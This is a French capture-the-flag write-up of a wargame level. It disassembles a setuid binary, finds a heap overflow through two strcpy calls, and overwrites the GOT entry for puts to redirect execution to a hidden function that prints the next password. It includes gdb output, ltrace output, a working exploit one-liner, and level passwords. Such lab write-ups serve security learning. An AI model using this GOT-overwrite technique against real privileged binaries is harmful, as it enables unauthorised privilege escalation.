# Level7

> login:password -> *`level7:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`*
```
:~$ su level7
Password:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
---

```
:~$ pwd
/home/user/level7
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level7` :

```
:~$ ./level7
Segmentation fault (core dumped)

:~$ ./level7 test
Segmentation fault (core dumped)
```

Avec ou sans paramètre le binaire segfault.

```
:~$ gdb level7
...

(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	    push   %ebp
   0x08048522 <+1>:	    mov    %esp,%ebp
   0x08048524 <+3>:	    and    $0xfffffff0,%esp
   0x08048527 <+6>:	    sub    $0x20,%esp
   0x0804852a <+9>:	    movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
```

Le main appel plusieurs fonctions `malloc()`:
- (+16) de `0x8` (8)
- (+42) de `0x8` (8)
- (+63) de `0x8` (8)
- (+89) de `0x8` (8)

On y voit aussi l'utilisation de deux fonctions `strcpy()` qui attendent des arguments 1 et 2. Du coup je rajoute ce petit test, car le segfault est probablement provoque par le manque d'un 2e argument.

```
:~$ ./level7 test test
~~
```

Effectivement, cette fois le binaire ne segfault pas, mais affiche `~~`. On continue donc de voir ce que le binaire contient.

On voit l'utilisation d'une fonction `fopen()`, ainsi que d'une fonction `fgets()` contenu dans une variable globale `c`, mais ne fait rien avec.

Puis au final on voit l'utilisation de `puts()` qui est la fonction qui introduit les caracteres `~~` une fois que 2 arguments ont pu etre renseigne


```
(gdb) info functions
All defined functions:

Non-debugging symbols:
(...)
0x080483b0  printf@plt
(...)
0x080483c0  fgets@plt
(...)
0x080483d0  time@plt
(...)
0x080483e0  strcpy@plt
(...)
0x080483f0  malloc@plt
(...)
0x08048400  puts@plt
(...)
0x08048430  fopen@plt
(...)
0x080484f4  m
0x08048521  main
(...)

(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	    push   %ebp
   0x080484f5 <+1>:	    mov    %esp,%ebp
   0x080484f7 <+3>:	    sub    $0x18,%esp
   0x080484fa <+6>:	    movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
```

On trouve egalement une fonction `m()` non appelee qui elle contient une fonction `time()` et `printf()`

Pour notre exploit, on va utiliser le 1er appel a la fonction `strcpy()` pour overwrite l'adresse du 2e. Ce qu'on veux c'est overwrite `puts()` pour acceder a la fonction `m()` a la place

```
:~$ ltrace ./level7 AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz test2
__libc_start_main(0x8048521, 3, 0xbffff704, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                         = 0x0804a008
malloc(8)                                                         = 0x0804a018
malloc(8)                                                         = 0x0804a028
malloc(8)                                                         = 0x0804a038
strcpy(0x0804a018, "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPp"...)         = 0x0804a018
strcpy(0x6c4c6b4b, "test2" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

```

On trouve un offset a **20**.

On va overflow le premier argument avec l'adresse de puts dans le GOT pour mettre ensuite l'adresse de `m()` dans le second. Pour ce faire on va chercher l'adresse de puts dans le GOT.

```
:~$ gdb level7
...

(gdb) disas main
(...)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>

(gdb) disas 0x8048400
(...)
   0x08048400 <+0>:     jmp    *0x8049928

(gdb) x 0x8049928
   0x8049928 <puts@got.plt>:       0x08048406

```

On a donc:
- l'adresse de puts dans le GOT: `0x8049928` + un offset de 20 pour l'overflow
- l'adresse de `m()`: `0x080484f4`

Ce qui nous donne:

```
:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```